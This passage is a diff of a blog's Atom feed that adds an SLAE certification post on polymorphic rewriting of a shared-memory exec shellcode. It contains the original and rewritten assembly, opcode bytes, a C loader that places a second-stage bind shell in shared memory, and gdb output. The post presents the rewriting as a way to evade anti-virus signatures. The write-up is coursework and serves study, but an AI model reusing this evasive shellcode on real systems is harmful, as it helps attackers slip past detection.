@@ -4,7 +4,7 @@
   <title><![CDATA[tcunha.github.io]]></title>
   <link href="http://tcunha.github.io/atom.xml" rel="self"/>
   <link href="http://tcunha.github.io/"/>
-  <updated>2018-07-21T09:18:11+00:00</updated>
+  <updated>2018-08-15T20:06:17+00:00</updated>
   <id>http://tcunha.github.io/</id>
   <author>
     <name><![CDATA[tcunha]]></name>
@@ -12,6 +12,1377 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[SLAE 0x06: Polymorphic Shellcodes]]></title>
+    <link href="http://tcunha.github.io/blog/2018/07/28/slae-0x06-polymorphic-shellcodes/"/>
+    <updated>2018-07-28T08:20:29+00:00</updated>
+    <id>http://tcunha.github.io/blog/2018/07/28/slae-0x06-polymorphic-shellcodes</id>
+    <content type="html"><![CDATA[<pre><code>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+
+http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert
+
+Student-ID: SLAE-1154
+</code></pre>
+
+<p>The sixth exercise consisted of choosing 3 linux/x86 shellcodes from <a href="http://shell-storm.org/shellcode/">shell-storm.org</a> and polymorphically alter them. The resulting shellcode should have at the most 150% the size of the original one.</p>
+
+<p>This technique is useful for bypassing anti-virus engines where common operations are fingerprinted and blacklisted. By modifying a shellcode with semantically equivalent instructions, the shellcode will be harder to detect.</p>
+
+<h3>1. Shared memory exec (369)</h3>
+
+<p><a href="http://shell-storm.org/shellcode/files/shellcode-369.php">This</a> shellcode consists of attaching to a shared memory region and executing the in memory shellcode. It&rsquo;s initial size is <strong>50 bytes</strong>, therefore its polymorphic code must be <strong>75 bytes</strong> maximum, according to the requirements.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">edi</span><span class="p">,</span> <span class="no">edi</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">esi</span><span class="p">,</span> <span class="no">esi</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="mi">0xdeadbeef</span>     <span class="err">;</span> <span class="no">key</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">bl</span><span class="p">,</span> <span class="mi">0x17</span>            <span class="err">;</span> <span class="no">shmget</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">edx</span> <span class="no">is</span> <span class="no">already</span> <span class="no">zero</span> <span class="no">from</span> <span class="no">the</span> <span class="no">above</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">esi</span> <span class="no">is</span> <span class="no">already</span> <span class="no">zero</span> <span class="no">frm</span> <span class="no">the</span> <span class="no">above</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x75</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">ipc</span><span class="p">(</span><span class="no">unsigned</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">void</span> <span class="p">*,</span> <span class="no">long</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">edi</span><span class="p">,</span> <span class="no">edi</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="mi">0xbffffffa</span>     <span class="err">;</span> <span class="no">address</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">edx</span><span class="p">,</span> <span class="no">edx</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span>            <span class="err">;</span> <span class="no">move</span> <span class="no">shm</span> <span class="no">id</span> <span class="no">returned</span> <span class="no">by</span> <span class="no">the</span> <span class="no">shmget</span> <span class="no">above</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">ebx</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">bl</span><span class="p">,</span> <span class="mi">0x15</span>            <span class="err">;</span> <span class="no">shmat</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x75</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">ipc</span><span class="p">(</span><span class="no">unsigned</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">void</span> <span class="p">*,</span> <span class="no">long</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">push</span> <span class="no">logical</span> <span class="no">address</span> <span class="no">to</span> <span class="no">the</span> <span class="no">stack</span> <span class="no">and</span> <span class="no">jump</span> <span class="no">to</span> <span class="no">it</span> <span class="no">after</span> <span class="no">the</span> <span class="no">ret</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">eax</span><span class="p">,</span> <span class="mi">0xbffffffa</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="err">[</span><span class="no">eax</span><span class="err">]</span>
+</span><span class='line'>  <span class="nf">ret</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The above original shellcode will obtain the identifier associated with the provided shared memory key, attach to it and jump to the in memory executable code, if any.</p>
+
+<p>This is using the <a href="http://man7.org/linux/man-pages/man2/ipc.2.html">ipc(2)</a> system call, where like <a href="http://man7.org/linux/man-pages/man2/socketcall.2.html">socketcall(2)</a>, its first argument is the IPC function to invoke. However, unlike the socket system calls which are now exported on x86, the IPC ones aren&rsquo;t.</p>
+
+<p>Its <a href="https://github.com/torvalds/linux/blob/716a685fdb89942a50c4138141027e38336a895f/ipc/syscall.c#L81">fourth parameter</a> (third in the prototype) is a user-provided logical address pointer where the contents of the shared memory can be accessed.</p>
+
+<figure class='code'><figcaption><span>ipc(2) prototype</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">ipc</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">call</span><span class="p">,</span> <span class="kt">int</span> <span class="n">first</span><span class="p">,</span> <span class="kt">int</span> <span class="n">second</span><span class="p">,</span> <span class="kt">int</span> <span class="n">third</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="kt">long</span> <span class="n">fifth</span><span class="p">);</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span>retrieving the system call number and constants</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>asm-syscall ipc
+</span><span class='line'><span class="c">#define __NR_ipc 117</span>
+</span><span class='line'>0x75
+</span><span class='line'><span class="nv">$ </span>grep SHM /usr/include/linux/ipc.h
+</span><span class='line'><span class="c">#define SHMAT           21</span>
+</span><span class='line'><span class="c">#define SHMDT           22</span>
+</span><span class='line'><span class="c">#define SHMGET          23</span>
+</span><span class='line'><span class="c">#define SHMCTL          24</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The registers for the two <a href="http://man7.org/linux/man-pages/man2/ipc.2.html">ipc(2)</a> system calls will, then, have the following respective values:</p>
+
+<pre><code>+----------+---------------+
+| register |     value     |
++----------+---------------+
+| eax      | 117           |
+| ebx      | 23            | &lt;== shmget(2)
+| ecx      | 0xdeafbeef    |
+| edx      | 0             | &lt;== size is specified by the creator
+| esi      | 0             | &lt;== so are the flags
+| edi      | 0             |
+| ebp      | 0             |
++----------+---------------+
+| return   | id            |
++----------+---------------+
+
++----------+---------------+
+| register |     value     |
++----------+---------------+
+| eax      | 117           |
+| ebx      | 21            | &lt;== shmat(2)
+| ecx      | shmget(2) id  |
+| edx      | 0             | &lt;== flags
+| esi      | address       |
+| edi      | 0             |
+| ebp      | 0             |
++----------+---------------+
+</code></pre>
+
+<p>Initially, couldn&rsquo;t get it to work due to the hard-coded shared memory logical address. Substituting it with the current logical address of the stack allows to correctly read the contents off the shared memory.</p>
+
+<p>The below polymorphic shellcode also gets the shared memory key by negating its initial value and performing logic and mathematical operations on the registers and is 11 bytes smaller than the original:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'>  <span class="nf">cdq</span>                     <span class="err">;</span> <span class="no">make</span> <span class="no">edx</span> <span class="no">zero</span><span class="p">,</span> <span class="no">as</span> <span class="no">well</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">ipc</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="no">has</span> <span class="no">a</span> <span class="no">bunch</span> <span class="no">of</span> <span class="no">parameters</span><span class="p">,</span> <span class="no">zero</span> <span class="no">them</span> <span class="no">all</span>
+</span><span class='line'>  <span class="nf">lea</span> <span class="no">ebx</span><span class="p">,</span> <span class="err">[</span><span class="no">eax</span><span class="err">]</span>
+</span><span class='line'>  <span class="nf">and</span> <span class="no">esi</span><span class="p">,</span> <span class="no">ebx</span>
+</span><span class='line'>  <span class="nf">sub</span> <span class="no">edi</span><span class="p">,</span> <span class="no">edi</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">ebp</span><span class="p">,</span> <span class="no">ebp</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="mi">0x35014542</span>     <span class="err">;</span> <span class="no">key</span> <span class="no">in</span> <span class="no">two</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">complement</span>
+</span><span class='line'>  <span class="nf">neg</span> <span class="no">ecx</span>                 <span class="err">;</span> <span class="no">key</span>
+</span><span class='line'>  <span class="nf">add</span> <span class="no">bl</span><span class="p">,</span> <span class="mi">0x17</span>            <span class="err">;</span> <span class="no">shmget</span> <span class="p">(</span><span class="no">ebx</span> <span class="no">is</span> <span class="no">already</span> <span class="no">zero</span><span class="p">)</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">edx</span><span class="p">,</span> <span class="no">esi</span> <span class="no">and</span> <span class="no">ebp</span> <span class="no">are</span> <span class="no">already</span> <span class="no">zero</span> <span class="no">from</span> <span class="no">the</span> <span class="no">above</span>
+</span><span class='line'>  <span class="nf">or</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x75</span>             <span class="err">;</span> <span class="no">eax</span> <span class="no">is</span> <span class="no">already</span> <span class="no">zero</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">ipc</span><span class="p">(</span><span class="no">unsigned</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">void</span> <span class="p">*,</span> <span class="no">long</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">esi</span><span class="p">,</span> <span class="no">esp</span>            <span class="err">;</span> <span class="no">use</span> <span class="no">stack</span> <span class="no">logical</span> <span class="no">address</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">eax</span>            <span class="err">;</span> <span class="no">move</span> <span class="no">shm</span> <span class="no">id</span> <span class="no">returned</span> <span class="no">by</span> <span class="no">the</span> <span class="no">shmget</span> <span class="no">above</span>
+</span><span class='line'>  <span class="nf">dec</span> <span class="no">ebx</span>
+</span><span class='line'>  <span class="nf">dec</span> <span class="no">ebx</span>                 <span class="err">;</span> <span class="no">shmat</span> <span class="p">(</span><span class="mi">0x2</span> <span class="no">less</span> <span class="no">than</span> <span class="no">shmget</span><span class="p">)</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">edx</span><span class="p">,</span> <span class="no">esi</span> <span class="no">and</span> <span class="no">ebp</span> <span class="no">are</span> <span class="no">already</span> <span class="no">zero</span> <span class="no">from</span> <span class="no">the</span> <span class="no">above</span>
+</span><span class='line'>  <span class="nf">and</span> <span class="no">eax</span><span class="p">,</span> <span class="no">ebp</span>            <span class="err">;</span> <span class="no">make</span> <span class="no">it</span> <span class="no">zero</span>
+</span><span class='line'>  <span class="nf">add</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x75</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">ipc</span><span class="p">(</span><span class="no">unsigned</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">int</span><span class="p">,</span> <span class="no">void</span> <span class="p">*,</span> <span class="no">long</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">jmp</span> <span class="err">[</span><span class="no">esi</span><span class="err">]</span>               <span class="err">;</span> <span class="no">finally</span> <span class="no">jump</span> <span class="no">to</span> <span class="no">the</span> <span class="no">second</span> <span class="no">stage</span> <span class="no">shellcode</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Just like with the egghunter exercise, a custom second stage shellcode can be specified via the <strong>STAGE2</strong> variable, which will be copied to the shared memory region:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>make <span class="nv">PROG</span><span class="o">=</span><span class="m">369</span> <span class="nv">STAGE2</span><span class="o">=</span>../0x01-bind/bind
+</span><span class='line'>nasm  -f elf32 -o 369.o 369.asm
+</span><span class='line'>ld -N -zexecstack -o <span class="m">369</span> 369.o
+</span><span class='line'><span class="m">08048080</span> &lt;_start&gt;:
+</span><span class='line'> 8048080:       <span class="m">31</span> c0                   xor    eax,eax
+</span><span class='line'> 8048082:       <span class="m">99</span>                      cdq
+</span><span class='line'> 8048083:       8d <span class="m">18</span>                   lea    ebx,<span class="o">[</span>eax<span class="o">]</span>
+</span><span class='line'> 8048085:       <span class="m">21</span> de                   and    esi,ebx
+</span><span class='line'> 8048087:       <span class="m">29</span> ff                   sub    edi,edi
+</span><span class='line'> 8048089:       <span class="m">31</span> ed                   xor    ebp,ebp
+</span><span class='line'> 804808b:       b9 <span class="m">42</span> <span class="m">45</span> <span class="m">01</span> <span class="m">35</span>          mov    ecx,0x35014542
+</span><span class='line'> 8048090:       f7 d9                   neg    ecx
+</span><span class='line'> 8048092:       <span class="m">80</span> c3 <span class="m">17</span>                add    bl,0x17
+</span><span class='line'> 8048095:       0c <span class="m">75</span>                   or     al,0x75
+</span><span class='line'> 8048097:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
+</span><span class='line'> 8048099:       <span class="m">89</span> e6                   mov    esi,esp
+</span><span class='line'> 804809b:       <span class="m">89</span> c1                   mov    ecx,eax
+</span><span class='line'> 804809d:       4b                      dec    ebx
+</span><span class='line'> 804809e:       4b                      dec    ebx
+</span><span class='line'> 804809f:       <span class="m">21</span> e8                   and    eax,ebp
+</span><span class='line'> 80480a1:       <span class="m">04</span> <span class="m">75</span>                   add    al,0x75
+</span><span class='line'> 80480a3:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
+</span><span class='line'> 80480a5:       ff <span class="m">26</span>                   jmp    DWORD PTR <span class="o">[</span>esi<span class="o">]</span>
+</span><span class='line'>Shellcode size: 39
+</span><span class='line'><span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>99<span class="se">\x</span>8d<span class="se">\x</span>18<span class="se">\x</span>21<span class="se">\x</span>de<span class="se">\x</span>29<span class="se">\x</span>ff<span class="se">\x</span>31<span class="se">\x</span>ed<span class="se">\x</span>b9<span class="se">\x</span>42<span class="se">\x</span>45<span class="se">\x</span>01<span class="se">\x</span>35<span class="se">\x</span>f7<span class="se">\x</span>d9<span class="se">\x</span>80<span class="se">\x</span>c3<span class="se">\x</span>17<span class="se">\x</span>0c<span class="se">\x</span>75<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>89<span class="se">\x</span>e6<span class="se">\x</span>89<span class="se">\x</span>c1<span class="se">\x</span>4b<span class="se">\x</span>4b<span class="se">\x</span>21<span class="se">\x</span>e8<span class="se">\x</span>04<span class="se">\x</span>75<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>ff<span class="se">\x</span>26
+</span><span class='line'>cc -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes 369<span class="sb">`</span> -DSTAGE2<span class="o">=</span><span class="sb">`</span>asm-opcodes ../0x01-bind/bind<span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode 369.c
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;sys/shm.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#include &lt;err.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="cp">#define QUOTE(s)        #s</span>
+</span><span class='line'><span class="cp">#define SHM_SIZE        512</span>
+</span><span class='line'><span class="cp">#define STR(s)          QUOTE(s)</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="n">STR</span><span class="p">(</span><span class="n">SHELLCODE</span><span class="p">);</span>
+</span><span class='line'><span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">stage2</span><span class="p">[]</span> <span class="o">=</span> <span class="n">STR</span><span class="p">(</span><span class="n">STAGE2</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span>
+</span><span class='line'><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="kt">int</span>      <span class="n">shmid</span><span class="p">;</span>
+</span><span class='line'>  <span class="kt">void</span>    <span class="o">*</span><span class="n">addr</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">shmid</span> <span class="o">=</span> <span class="n">shmget</span><span class="p">(</span><span class="mh">0xcafebabe</span><span class="p">,</span> <span class="n">SHM_SIZE</span><span class="p">,</span> <span class="mo">0644</span><span class="o">|</span><span class="n">IPC_CREAT</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;shmget&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">((</span><span class="n">addr</span> <span class="o">=</span> <span class="n">shmat</span><span class="p">(</span><span class="n">shmid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">err</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">&quot;shmat&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="n">memcpy</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">stage2</span><span class="p">,</span> <span class="n">SHM_SIZE</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Shellcode length: %zu</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="k">sizeof</span> <span class="n">shellcode</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="n">shellcode</span><span class="p">)();</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Breaking just before the jmp call, the contents of the second stage shellcode are correctly referenced:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b *0x00402085
+</span><span class='line'>Breakpoint <span class="m">2</span> at 0x402085
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="k">continue</span>
+</span><span class='line'>Continuing.
+</span><span class='line'>Dump of assembler code <span class="k">for</span> <span class="k">function</span> shellcode:
+</span><span class='line'>   0x00402060 &lt;+0&gt;:     xor    eax,eax
+</span><span class='line'>   0x00402062 &lt;+2&gt;:     cdq
+</span><span class='line'>   0x00402063 &lt;+3&gt;:     lea    ebx,<span class="o">[</span>eax<span class="o">]</span>
+</span><span class='line'>   0x00402065 &lt;+5&gt;:     and    esi,ebx
+</span><span class='line'>   0x00402067 &lt;+7&gt;:     sub    edi,edi
+</span><span class='line'>   0x00402069 &lt;+9&gt;:     xor    ebp,ebp
+</span><span class='line'>   0x0040206b &lt;+11&gt;:    mov    ecx,0x35014542
+</span><span class='line'>   0x00402070 &lt;+16&gt;:    neg    ecx
+</span><span class='line'>   0x00402072 &lt;+18&gt;:    add    bl,0x17
+</span><span class='line'>   0x00402075 &lt;+21&gt;:    or     al,0x75
+</span><span class='line'>   0x00402077 &lt;+23&gt;:    int    0x80
+</span><span class='line'>   0x00402079 &lt;+25&gt;:    mov    esi,esp
+</span><span class='line'>   0x0040207b &lt;+27&gt;:    mov    ecx,eax
+</span><span class='line'>   0x0040207d &lt;+29&gt;:    dec    ebx
+</span><span class='line'>   0x0040207e &lt;+30&gt;:    dec    ebx
+</span><span class='line'>   0x0040207f &lt;+31&gt;:    and    eax,ebp
+</span><span class='line'>   0x00402081 &lt;+33&gt;:    add    al,0x75
+</span><span class='line'>   0x00402083 &lt;+35&gt;:    int    <span class="nv">0x80</span>
+</span><span class='line'><span class="o">=</span>&gt; 0x00402085 &lt;+37&gt;:    jmp    DWORD PTR <span class="o">[</span>esi<span class="o">]</span>
+</span><span class='line'>   0x00402087 &lt;+39&gt;:    add    BYTE PTR <span class="o">[</span>eax<span class="o">]</span>,al
+</span><span class='line'>End of assembler dump.
+</span><span class='line'><span class="nv">$2</span> <span class="o">=</span> <span class="o">[</span> IF <span class="o">]</span>
+</span><span class='line'>
+</span><span class='line'>Breakpoint 2, 0x00402085 in shellcode <span class="o">()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> i r esi
+</span><span class='line'>esi            0xbffff62c       -1073744340
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/10i *<span class="nv">$esi</span>
+</span><span class='line'>   0xb7fd2000:  xor    eax,eax
